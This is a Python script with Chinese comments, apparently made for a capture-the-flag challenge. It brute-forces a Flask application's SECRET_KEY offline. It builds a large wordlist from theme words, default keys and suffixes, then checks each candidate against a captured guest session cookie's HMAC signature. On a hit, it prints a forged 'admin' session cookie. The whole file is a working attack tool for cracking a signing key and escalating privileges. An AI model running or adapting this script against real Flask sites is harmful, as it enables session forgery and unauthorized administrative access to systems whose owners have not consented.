# -*- coding: utf-8 -*-
"""本地生成候选 SECRET_KEY 并离线验签（不下载任何字典）
用法: python brute_local.py [cookie]
命中后直接输出可用的 admin cookie
"""
import base64, hashlib, hmac, itertools, json, sys, time

COOKIE = sys.argv[1] if len(sys.argv) > 1 else \
    'eyJ1c2VybmFtZSI6Imd1ZXN0In0.auDCfw.Ks8t62b01xlh5MHBGnSvdWHZ-P8'

def b64d(s):
    return base64.urlsafe_b64decode(s + '=' * (-len(s) % 4))

def b64e(b):
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

p_b64, t_b64, s_b64 = COOKIE.split('.')
VALUE = (p_b64 + '.' + t_b64).encode()
WANT = b64d(s_b64)

def sign(key, value):
    dk = hmac.new(key.encode('utf-8', 'ignore'), b'cookie-session', hashlib.sha1).digest()
    return hmac.new(dk, value, hashlib.sha1).digest()

# ---- 词根：题目主题 + 框架默认 + 站点词 ----
ROOTS = """
obsidian obsidianlab obsidian_lab obsidian-lab obsidianlab2026 obsi obs
yaoshi yao_shi yaoshilab heiyaoshi 曜石 黑曜石 曜石影像 影像实验室 实验室
image imagelab image_lab image-lab photo photos lab laboratory archive archives
archieve archiever record records index legacy cleanup sync avatar avatars upload
uploads profile profiles console dashboard admin administrator manager
htuctf HTUCTF Htuctf htuctf2026 htuctf2025 htuctf2027 flag fl4g ctf
guest root user account member staff portal node container
secret secretkey secret_key sec_key skey key token session cookie
flask app web application appsecret app_secret application php python
change changeme changeme123 default password passwd pass pwd qwerty toor
""".split()

SUFFIX = ["", "123", "1234", "12345", "123456", "0123", "01", "1", "!", "!!",
          "@123", "#123", "2024", "2025", "2026", "2026!", "2025!", "88", "888",
          "666", "_2026", "-2026", ".2026", "_2025", "2025", "admin", "root"]
SEP = ["", "_", "-", ".", ""]

cands = set()
for r in ROOTS:
    cands.add(r)
    cands.add(r.upper())
    cands.add(r.capitalize())
    cands.add(r.replace('_', '').replace('-', ''))
    for suf in SUFFIX:
        cands.add(r + suf)
        cands.add(r.capitalize() + suf)

# 双词组合
for a, b in itertools.product(ROOTS, repeat=2):
    if a == b or (len(a) + len(b)) > 24:
        continue
    for sep in SEP:
        cands.add(a + sep + b)
    if len(cands) > 600000:
        break

# 常见手工 key
cands.update(["thisisunsafe", "notsosecret", "you-will-never-guess",
              "hard_to_guess", "my_precious", "s3cr3t", "s3cr3t_k3y"])

print("[*] 候选数:", len(cands))
t0 = time.time()
hit = None
for i, k in enumerate(cands):
    if sign(k, VALUE) == WANT:
        hit = k
        break
    if i % 100000 == 0 and i:
        print("   ...%d  %.1fs" % (i, time.time() - t0))
print("[*] 耗时 %.1fs" % (time.time() - t0))

if hit:
    print("[+] SECRET_KEY =", repr(hit))
    p = b64e(json.dumps({'username': 'admin'}, separators=(',', ':')).encode())
    ts = b64e(int(time.time()).to_bytes(4, 'big'))
    v = (p + '.' + ts).encode()
    print("[+] admin cookie:", p + '.' + ts + '.' + b64e(sign(hit, v)))
else:
    print("[-] 未命中 —— 换思路，别死磕 key")
